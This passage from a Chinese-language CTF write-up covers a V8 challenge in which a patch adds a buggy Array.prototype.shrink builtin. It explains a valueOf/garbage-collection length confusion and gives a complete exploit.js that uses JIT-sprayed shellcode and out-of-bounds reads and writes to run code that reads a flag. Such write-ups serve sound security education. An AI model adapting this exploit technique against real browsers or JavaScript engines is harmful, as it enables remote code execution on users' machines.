class="addition">+</span></span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;shrink&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtin::kArrayShrink, 1, false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;, Builtin::kArrayPrototypeFill,</span><br><span class="line"><span class="comment">diff --git a/to_give/args.gn b/to_give/args.gn</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..a9991ad8f2f</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/to_give/args.gn</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,12 @@</span></span><br><span class="line"><span class="addition">+# Build arguments go here.</span></span><br><span class="line"><span class="addition">+# See &quot;gn args &lt;out_dir&gt; --list&quot; for available build arguments.</span></span><br><span class="line"><span class="addition">+is_component_build = false</span></span><br><span class="line"><span class="addition">+is_debug = false</span></span><br><span class="line"><span class="addition">+target_cpu = &quot;x64&quot;</span></span><br><span class="line"><span class="addition">+v8_enable_sandbox = false</span></span><br><span class="line"><span class="addition">+v8_enable_backtrace = true</span></span><br><span class="line"><span class="addition">+v8_enable_disassembler = true</span></span><br><span class="line"><span class="addition">+v8_enable_object_print = true</span></span><br><span class="line"><span class="addition">+dcheck_always_on = false</span></span><br><span class="line"><span class="addition">+use_goma = false</span></span><br><span class="line"><span class="addition">+v8_code_pointer_sandboxing = false</span></span><br><span class="line"><span class="comment">diff --git a/to_give/d8 b/to_give/d8</span></span><br><span class="line">new file mode 100755</span><br><span class="line"><span class="comment">index 00000000000..37bcbb578c5</span></span><br><span class="line">Binary files /dev/null and b/to_give/d8 differ</span><br><span class="line"><span class="comment">diff --git a/to_give/patch b/to_give/patch</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..ee81b52da10</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/to_give/patch</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,78 @@</span></span><br><span class="line"><span class="addition">+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="addition">+index ea45a7ada6b..2552c286b60 100644</span></span><br><span class="line"><span class="addition">+--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">++++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="addition">+@@ -624,6 +624,45 @@ BUILTIN(ArrayShift) &#123;</span></span><br><span class="line"><span class="addition">+ </span></span><br><span class="line"><span class="addition">+   return GenericArrayShift(isolate, receiver, length);</span></span><br><span class="line"><span class="addition">+ &#125;</span></span><br><span class="line"><span class="addition">++BUILTIN(ArrayShrink) &#123;</span></span><br><span class="line"><span class="addition">++  HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">++  Factory *factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">++  Handle&lt;Object&gt; receiver = args.receiver();</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) &#123;</span></span><br><span class="line"><span class="addition">++    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">++      factory-&gt;NewStringFromAsciiChecked(&quot;Oldest trick in the book&quot;))</span></span><br><span class="line"><span class="addition">++    );</span></span><br><span class="line"><span class="addition">++  &#125;</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  Handle&lt;JSArray&gt; array = Cast&lt;JSArray&gt;(receiver);</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  if (args.length() != 2) &#123;</span></span><br><span class="line"><span class="addition">++    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">++      factory-&gt;NewStringFromAsciiChecked(&quot;specify length to shrink to &quot;))</span></span><br><span class="line"><span class="addition">++    );</span></span><br><span class="line"><span class="addition">++  &#125;</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  </span></span><br><span class="line"><span class="addition">++  uint32_t old_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  Handle&lt;Object&gt; new_len_obj;</span></span><br><span class="line"><span class="addition">++  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));</span></span><br><span class="line"><span class="addition">++  uint32_t new_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(*new_len_obj));</span></span><br><span class="line"><span class="addition">++  </span></span><br><span class="line"><span class="addition">++  if (new_len &gt;= old_len)&#123;</span></span><br><span class="line"><span class="addition">++    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">++      factory-&gt;NewStringFromAsciiChecked(&quot;invalid length&quot;))</span></span><br><span class="line"><span class="addition">++    );</span></span><br><span class="line"><span class="addition">++  &#125;</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++  array-&gt;set_length(Smi::FromInt(new_len));</span></span><br><span class="line"><span class="addition">++  </span></span><br><span class="line"><span class="addition">++  return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">++&#125;</span></span><br><span class="line"><span class="addition">+ </span></span><br><span class="line"><span class="addition">+ BUILTIN(ArrayUnshift) &#123;</span></span><br><span class="line"><span class="addition">+   HandleScope scope(isolate);</span></span><br><span class="line"><span class="addition">+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="addition">+index 78cbf8874ed..dc60d59e637 100644</span></span><br><span class="line"><span class="addition">+--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">++++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="addition">+@@ -424,6 +424,8 @@ namespace internal &#123;</span></span><br><span class="line"><span class="addition">+   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span></span><br><span class="line"><span class="addition">+   /* ES6 #sec-array.prototype.shift */                                         \</span></span><br><span class="line"><span class="addition">+   CPP(ArrayShift)                                                              \</span></span><br><span class="line"><span class="addition">++  CPP(ArrayShrink)                                                             \</span></span><br><span class="line"><span class="addition">++                                                                               \</span></span><br><span class="line"><span class="addition">+   /* ES6 #sec-array.prototype.unshift */                                       \</span></span><br><span class="line"><span class="addition">+   CPP(ArrayUnshift)                                                            \</span></span><br><span class="line"><span class="addition">+   /* Support for Array.from and other array-copying idioms */                  \</span></span><br><span class="line"><span class="addition">+diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="addition">+index 48249695b7b..c8c5c2eda25 100644</span></span><br><span class="line"><span class="addition">+--- a/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="comment">++++ b/src/init/bootstrapper.cc</span></span><br><span class="line"><span class="addition">+@@ -2535,6 +2535,9 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span></span><br><span class="line"><span class="addition">+                           true);</span></span><br><span class="line"><span class="addition">+     SimpleInstallFunction(isolate_, proto, &quot;concat&quot;,</span></span><br><span class="line"><span class="addition">+                           Builtin::kArrayPrototypeConcat, 1, false);</span></span><br><span class="line"><span class="addition">++</span></span><br><span class="line"><span class="addition">++    SimpleInstallFunction(isolate_, proto, &quot;shrink&quot;,</span></span><br><span class="line"><span class="addition">++                          Builtin::kArrayShrink, 1, false);</span></span><br><span class="line"><span class="addition">+     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,</span></span><br><span class="line"><span class="addition">+                           Builtin::kArrayPrototypeCopyWithin, 2, false);</span></span><br><span class="line"><span class="addition">+     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;, Builtin::kArrayPrototypeFill,</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="comment">diff --git a/to_give/snapshot_blob.bin b/to_give/snapshot_blob.bin</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..9bb75698752</span></span><br><span class="line">Binary files /dev/null and b/to_give/snapshot_blob.bin differ</span><br><span class="line"><span class="comment">diff --git a/tools/mb/mb.py b/tools/mb/mb.py</span></span><br><span class="line"><span class="comment">index 33b15a401fc..ada192695ed 100755</span></span><br><span class="line"><span class="comment">--- a/tools/mb/mb.py</span></span><br><span class="line"><span class="comment">+++ b/tools/mb/mb.py</span></span><br><span class="line"><span class="meta">@@ -18,7 +18,7 @@</span> import ast</span><br><span class="line"> import errno</span><br><span class="line"> import json</span><br><span class="line"> import os</span><br><span class="line"><span class="deletion">-import pipes</span></span><br><span class="line"><span class="addition">+import shlex as pipes</span></span><br><span class="line"> import platform</span><br><span class="line"> import pprint</span><br><span class="line"> import re</span><br><span class="line"><span class="comment">diff --git a/tools/rust b/tools/rust</span></span><br><span class="line">new file mode 160000</span><br><span class="line"><span class="comment">index 00000000000..f93e7ca2a64</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/tools/rust</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+Subproject commit f93e7ca2a64938e9b4759ec3297f02ca7b3f605f</span></span><br><span class="line"><span class="comment">diff --git a/tools/win b/tools/win</span></span><br><span class="line">new file mode 160000</span><br><span class="line"><span class="comment">index 00000000000..2cbfc8d2e5e</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/tools/win</span></span><br><span class="line">@@ -0,0 +1 @@</span><br><span class="line"><span class="addition">+Subproject commit 2cbfc8d2e5ef4a6afd9774e9a9eaebd921a9f248</span></span><br></pre></td></tr></table></figure>

<p>第一眼看过去好像并不存在漏洞🤔，这个 patch 给 array 对象写了个 shrink 函数，该函数接收一个 new_len 用来替换 array 的 old_len，且要求 new_len 必须小于 old_len  </p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">++  if (new_len &gt;= old_len)&#123;</span></span><br><span class="line"><span class="addition">++    THROW_NEW_ERROR_RETURN_FAILURE(</span></span><br><span class="line"><span class="addition">++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,</span></span><br><span class="line"><span class="addition">++      factory-&gt;NewStringFromAsciiChecked(&quot;invalid length&quot;))</span></span><br><span class="line"><span class="addition">++    );</span></span><br><span class="line"><span class="addition">++  &#125;</span></span><br></pre></td></tr></table></figure>

<p>这题的漏洞在于下面段代码：  </p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">++  Handle&lt;Object&gt; new_len_obj;</span></span><br><span class="line"><span class="addition">++  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));</span></span><br><span class="line"><span class="addition">++  uint32_t new_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(*new_len_obj));</span></span><br></pre></td></tr></table></figure>

<p>注意这里调用了 Object::ToNumber 来处理 shrink 方法返回一个数值，表示转换后的数字。当传入的值无法转换为有效的数字时，ToNumber 方法将返回 NaN。如果传入的值是一个对象，ToNumber 方法将调用该对象的 valueOf 方法并尝试将其返回值转换为数字。  </p>
<p>很明显这地方存在一个问题，我们可以知道 old_len 是在一开始就通过下面这段代码获取的：  </p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">++ uint32_t old_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));</span></span><br></pre></td></tr></table></figure>

<p>如果我们传入 shrink 的是一个对象且有 valueOf 方法，那么在调用 ToNumber 的时候就会执行 valueOf 方法中的内容并获取一个值。</p>
<p>我们可以在 valueOf 里面将 array 的 length 给改小并通过多次申请内存来触发 GC 的回收，并返回一个比原来 old_len 小的数来作为 new_len。这个时候 array 的 length 已经给改小且原有的在 length 之外的内存已经被 GC 回收，而 old_len 是在 array 的 len 给改小前获取的，也就是说 old_len 大于 array 目前的 length(now_length)。这个时候只需通过合理的构造即可实现 now_len &lt; new_len &lt; old_len 进而出现堆溢出:)  </p>
<p>这道题有个坑点就是远程的 d8 是通过以下代码启动并返回结果的：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With credit/inspiration to the v8 problem in downUnder CTF 2020</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">MAX_SIZE = <span class="number">20000</span></span><br><span class="line">input_size = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Provide size. Must be &lt; 5k:&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> input_size &gt;= MAX_SIZE:</span><br><span class="line">    p(<span class="string">f&quot;Received size of <span class="subst">&#123;input_size&#125;</span>, which is too big&quot;</span>)</span><br><span class="line">    sys.exit(-<span class="number">1</span>)</span><br><span class="line">p(<span class="string">f&quot;Provide script please!!&quot;</span>)</span><br><span class="line">script_contents = sys.stdin.read(input_size)</span><br><span class="line">p(script_contents)</span><br><span class="line"><span class="keyword">with</span> tempfile.NamedTemporaryFile(buffering=<span class="number">0</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(script_contents.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    p(<span class="string">&quot;File written. Running. Timeout is 20s&quot;</span>)</span><br><span class="line">    res = subprocess.run([<span class="string">&quot;./d8&quot;</span>, f.name], timeout=<span class="number">20</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    p(<span class="string">&quot;Run Complete&quot;</span>)</span><br><span class="line">    p(<span class="string">f&quot;Stdout <span class="subst">&#123;res.stdout&#125;</span>&quot;</span>)</span><br><span class="line">    p(<span class="string">f&quot;Stderr <span class="subst">&#123;res.stderr&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>我们是无法在远程获取 shell 的，只能获取 js 的运行结果，所以我们需要使用 orw 来将 flag 读出来  </p>
<h2 id="exploit-js"><a href="#exploit-js" class="headerlink" title="exploit.js"></a>exploit.js</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexx</span>(<span class="params">str, val</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[32m&quot;</span>+<span class="string">&quot;[+] &quot;</span>+str.<span class="title function_">padEnd</span>(<span class="number">32</span>, <span class="string">&#x27; &#x27;</span>)+<span class="string">&quot;: 0x&quot;</span>+val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)+<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.0</span>,</span><br><span class="line">        <span class="number">1.97111552590436e-246</span>,</span><br><span class="line">        <span class="number">1.9555091864988971e-246</span>,</span><br><span class="line">        <span class="number">1.9563329239833895e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.9920294542159152e-246</span>,</span><br><span class="line">        <span class="number">1.9314754824824017e-246</span>,</span><br><span class="line">        <span class="number">1.9711291562950226e-246</span>,</span><br><span class="line">        <span class="number">1.9560110683301727e-246</span>,</span><br><span class="line">        <span class="number">1.9710306750462755e-246</span>,</span><br><span class="line">        <span class="number">1.9711211830517716e-246</span>,</span><br><span class="line">        <span class="number">1.971182898881177e-246</span>,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">    <span class="title function_">foo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> roots = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x30000</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add_ref</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    roots[index++] = obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">major_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x7fe00000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">minor_gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">add_ref</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x200000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">add_ref</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mm1 = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> mm2 = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> mm3 = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> oob = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">200</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="keyword">let</span> new_len = &#123;</span><br><span class="line">    <span class="attr">valueOf</span>:<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        oob.<span class="property">length</span> = <span class="number">4</span>;</span><br><span class="line">        mm1 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(<span class="number">2.2</span>);</span><br><span class="line">        mm2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(&#123;&#125;);</span><br><span class="line">        mm2 = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(<span class="number">3.3</span>);</span><br><span class="line">        <span class="title function_">minor_gc</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">199</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">oob.<span class="title function_">shrink</span>(new_len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [<span class="number">0xdead</span>, <span class="number">0xbeef</span>, foo, obj_arr, oob, oob]; </span><br><span class="line"><span class="keyword">var</span> victim_arr = [<span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> leak = <span class="title function_">d2u</span>(oob[<span class="number">80</span>]) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"><span class="keyword">var</span> func_addr = leak &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;func_addr&quot;</span>, func_addr);</span><br><span class="line"></span><br><span class="line">oob[<span class="number">86</span>] = <span class="title function_">u2d</span>((func_addr &lt;&lt; <span class="number">32n</span>) | func_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_ptr = (<span class="title function_">d2u</span>(victim_arr[<span class="number">0</span>]) &gt;&gt; <span class="number">32n</span>) + <span class="number">0xcn</span>;</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;code_ptr&quot;</span>, code_ptr);</span><br><span class="line"></span><br><span class="line">oob[<span class="number">86</span>] = <span class="title function_">u2d</span>((code_ptr &lt;&lt; <span class="number">32n</span>) | code_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> orw_addr = (<span class="title function_">d2u</span>(victim_arr[<span class="number">0</span>]));</span><br><span class="line"><span class="title function_">hexx</span>(<span class="string">&quot;orw code addr&quot;</span>, orw_addr);</span><br><span class="line"></span><br><span class="line">victim_arr[<span class="number">0</span>] = <span class="title function_">u2d</span>(orw_addr + <span class="number">0x7en</span> - <span class="number">15n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>();</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/friend/">Link</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在最前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析与利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-js"><span class="toc-number">3.</span> <span class="toc-text">exploit.js</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/10/06/sv8/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/10/06/sv8/&text=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/10/06/sv8/&is_video=false&description=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SecurinetsCTF 2025 Sukunahikona&body=Check out this article: https://qanux.github.io/2025/10/06/sv8/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/10/06/sv8/&title=SecurinetsCTF 2025 Sukunahikona"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
